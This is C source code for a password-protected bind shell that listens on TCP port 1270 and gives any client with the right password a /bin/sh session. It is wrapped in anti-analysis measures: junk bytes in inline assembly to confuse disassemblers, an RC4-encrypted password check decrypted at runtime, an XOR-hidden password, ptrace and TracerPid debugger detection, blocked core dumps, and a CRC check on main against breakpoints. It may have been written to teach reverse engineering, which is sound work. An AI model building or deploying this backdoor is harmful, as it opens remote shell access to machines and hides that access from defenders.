#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ptrace.h>

#include "rc4.h"
#include "crc32.h"
#include "xor_string.h"

extern void* check_password_size;
unsigned char check_password_key[128] __attribute((section(".rc4_check_password"))) = { 0 };

uint32_t madvise_base __attribute((section(".madvise_base_addr"))) = 0;
uint32_t madvise_size __attribute((section(".madvise_size"))) = 0;

extern void* main_function_size;
uint32_t main_function_crc __attribute((section(".compute_crc_main_function"))) = 0;

char* calc_addr(char* p_addr)
{
    return p_addr + 0x400000;
}

bool __attribute__((optimize("O1"), section(".check_password")))
    check_password(const char* p_password)
{
    char pass[password_size] = {};
    char* label_address = 0;

    asm volatile(
        "mov_ins:\n"
        "mov $2283, %%rax\n"
        "xor %%rax, %%rax\n"
        "jz mov_ins+3\n"
        ".byte 0xe8\n"
        : :
        : "%rax");

    asm volatile(
        "xor %%rax, %%rax\n"
        "jz always_here + 1\n"
        "always_here:\n"
        ".byte 0xe8\n"
        : :
        : "%rax");

    asm volatile(
        "jz unaligned+1\n"
        "jnz unaligned+1\n"
        "unaligned:\n"
        ".byte 0xe8\n");

    label_address = calc_addr(((char*)&&return_here) - 0x400000);

    asm volatile(
        "push %0\n"
        "ret\n"
        ".string \"\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\""
        :
        : "g"(label_address));

    return_here:
    XOR_STRING31(pass, password, 0xaa);

    // validate the password
    return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;
}

/*
 * Checks the "TracerPid" entry in the /proc/self/status file. If the value
 * is not zero then a debugger has attached. If a debugger is attached then
 * signal to the parent pid and exit.
 */
void check_proc_status()
{
    FILE* proc_status = fopen("/proc/self/status", "r");
    if (proc_status == NULL)
    {
        return;
    }

    char line[1024] = { };
    char *fgets(char *s, int size, FILE *stream);
    while (fgets(line, sizeof(line), proc_status) != NULL)
    {
        const char traceString[] = "TracerPid:";
        char* tracer = strstr(line, traceString);
        if (tracer != NULL)
        {
            int pid = atoi(tracer + sizeof(traceString) - 1);
            if (pid != 0)
            {
                fclose(proc_status);
                exit(EXIT_FAILURE);
            }
        }
    }
    fclose(proc_status);
}

/**
 * This implements a fairly simple bind shell. The server first requires a
 * password before allowing access to the shell. The password is currently
 * randomly generated each time 'cmake ..' is run. The server has no shutdown
 * mechanism so it will run until killed.
 */
int __attribute__((section(".main_function"))) main(int p_argc, char* p_argv[])
{
    (void)p_argc;
    (void)p_argv;

    int fork_pid = fork();
    if (fork_pid == 0)
    {
        // set the process as undumpable
        prctl(PR_SET_DUMPABLE, 0);

        // trace the parent process
        int parent = getppid();
        if (ptrace(PTRACE_ATTACH, parent, NULL, NULL) != 0)
        {
            kill(parent, SIGKILL);
            exit(EXIT_FAILURE);
        }

        // restart the parent so it can keep processing like normal
        int status = 0;
        wait(&status);
        if (ptrace(PTRACE_SETOPTIONS, parent, NULL, PTRACE_O_TRACEFORK | PTRACE_O_EXITKILL) != 0)
        {
            kill(parent, SIGKILL);
            exit(EXIT_FAILURE);
        }
        ptrace(PTRACE_CONT, parent, NULL, NULL);

        // preventing dumping of the provided address space
        madvise((void*)madvise_base, madvise_size, MADV_DONTDUMP);

        // handle any signals that may come in from tracees
        while (true)
        {
            check_proc_status();
            int pid = waitpid(-1, &status, WNOHANG);
            if (pid == 0)
            {
                sleep(1);
                continue;
            }

            if (status >> 16 == PTRACE_EVENT_FORK)
            {
                // follow the fork
                long newpid = 0;
                ptrace(PTRACE_GETEVENTMSG, pid, NULL, &newpid);
                ptrace(PTRACE_ATTACH, newpid, NULL, NULL);
                ptrace(PTRACE_CONT, newpid, NULL, NULL);
            }
            ptrace(PTRACE_CONT, pid, NULL, NULL);
        }
    }

   int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (sock == -1)
   {
       fprintf(stderr, "Failed to create the socket.");
       return EXIT_FAILURE;
   }

   struct sockaddr_in bind_addr = {};
   bind_addr.sin_family = AF_INET;
   bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
   bind_addr.sin_port = htons(1270);

   int bind_result = bind(sock, (struct sockaddr*) &bind_addr,
                          sizeof(bind_addr));
   if (bind_result != 0)
   {
       perror("Bind call failed");
       return EXIT_FAILURE;
   }

   int listen_result = listen(sock, 5);
   if (listen_result != 0)
   {
       perror("Listen call failed");
       return EXIT_FAILURE;
   }

   while (true)
   {
       int client_sock = accept(sock, NULL, NULL);
       if (client_sock < 0)
       {
           perror("Accept call failed");
           return EXIT_FAILURE;
       }

       int child_pid = fork();
       if (child_pid == 0)
       {
           // read in the password
           char password_input[password_size] = { 0 };
           int read_result = read(client_sock, password_input, password_size - 1);
           if (read_result < (int)(password_size - 1))
           {
               close(client_sock);
               return EXIT_FAILURE;
           }

           // decrypt valid target
           struct rc4_state state = {};
           mprotect(check_password, (uint64_t)&check_password_size, PROT_READ | PROT_WRITE | PROT_EXEC);
           rc4_init(&state, check_password_key, sizeof(check_password_key));
           rc4_crypt(&state, (unsigned char*)check_password, (unsigned char*)check_password,
                     (uint64_t)&check_password_size);
           mprotect(check_password, (uint64_t)&check_password_size, PROT_READ | PROT_EXEC);

           if (check_password(password_input))
           {
               close(client_sock);
               return EXIT_FAILURE;
           }

           dup2(client_sock, 0);
           dup2(client_sock, 1);
           dup2(client_sock, 2);

           char* empty[] = { NULL };
           char binsh[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };
           execve(binsh, empty, empty);
           close(client_sock);
           return EXIT_SUCCESS;
       }

       close(client_sock);
   }
}

/**
 * Before we enter main check to see if a debugger is present
 */
void __attribute__((constructor)) before_main()
{
    // check for bp in launch_thread
    if(crc32_bitwise((unsigned char*)(&main), (uint64_t)&main_function_size) !=
        main_function_crc)
    {
        exit(0);
    }
    check_proc_status();
}
